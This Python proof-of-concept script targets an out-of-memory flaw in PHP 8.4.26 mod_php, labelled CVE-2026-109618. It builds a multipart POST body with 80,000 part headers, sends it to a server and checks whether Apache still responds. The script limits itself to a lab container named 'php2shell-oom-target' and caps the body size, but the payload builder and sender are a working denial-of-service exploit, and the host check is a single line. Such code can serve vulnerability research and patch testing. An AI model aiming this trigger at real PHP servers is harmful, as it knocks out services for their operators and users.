#!/usr/bin/env python3
"""Bounded local trigger for the CVE-2026-109618 multipart OOM condition.

This intentionally demonstrates only the OOM/cleanup trigger described by
PHP's advisory. It does not attempt memory corruption or command execution.
The target must be a disposable, isolated local PHP 8.4.26 mod_php container.
"""

from __future__ import annotations

import http.client
import sys
import time
from urllib.parse import urlsplit

HEADER_COUNT = 80_000
VALUE = b"v" * 64
BOUNDARY = b"local-php-oom-poc"
MAX_BODY = 7_900_000


def make_body() -> bytes:
    head = (
        b"--" + BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="upload"; filename="probe.bin"\r\n'
        b"Content-Type: application/octet-stream\r\n"
    )
    lines = bytearray()
    for i in range(HEADER_COUNT):
        lines.extend(f"X-Poc-{i:08d}: ".encode("ascii"))
        lines.extend(VALUE)
        lines.extend(b"\r\n")
    body = head + bytes(lines) + b"\r\nlocal\r\n--" + BOUNDARY + b"--\r\n"
    if len(body) > MAX_BODY:
        raise SystemExit(f"Refusing oversized trigger body: {len(body)} bytes")
    return body


def request(url: str, method: str = "GET", body: bytes | None = None):
    parsed = urlsplit(url)
    if parsed.scheme != "http" or parsed.hostname != "php2shell-oom-target":
        raise SystemExit("Only the isolated php2shell-oom-target container is allowed")
    conn = http.client.HTTPConnection(parsed.hostname, parsed.port or 80, timeout=8)
    path = parsed.path or "/"
    conn.request(method, path, body=body, headers={
        "Content-Type": f"multipart/form-data; boundary={BOUNDARY.decode()}" if body else "text/plain",
        "Connection": "close",
    })
    response = conn.getresponse()
    result = response.status, response.read(2048).decode("latin1", "replace")
    conn.close()
    return result


def main() -> None:
    url = sys.argv[1] if len(sys.argv) > 1 else "http://php2shell-oom-target/"
    for attempt in range(20):
        try:
            status, body = request(url)
            break
        except (OSError, TimeoutError):
            if attempt == 19:
                raise
            time.sleep(1)
    if "PHP_READY 8.4.26 apache2handler" not in body:
        raise SystemExit(f"Unexpected lab target: HTTP {status}, {body[:200]!r}")
    print(f"Baseline: HTTP {status}; {body.strip()}")

    payload = make_body()
    print(f"Sending bounded multipart OOM trigger: {HEADER_COUNT} part headers, {len(payload)} bytes")
    try:
        status, body = request(url, "POST", payload)
        print(f"Trigger response: HTTP {status}; {body[:200]!r}")
    except (OSError, TimeoutError) as exc:
        print(f"Trigger request ended during server-side OOM handling: {type(exc).__name__}: {exc}")

    time.sleep(1)
    try:
        status, body = request(url)
        if "PHP_READY 8.4.26 apache2handler" in body:
            print(f"Follow-up health check: HTTP {status}; Apache still serves requests")
        else:
            print(f"Follow-up response: HTTP {status}; {body[:200]!r}")
    except (OSError, TimeoutError) as exc:
        print(f"Follow-up health check failed: {type(exc).__name__}: {exc}")

    print("Scope: OOM trigger only; no RCE claim or command execution was attempted.")


if __name__ == "__main__":
    main()
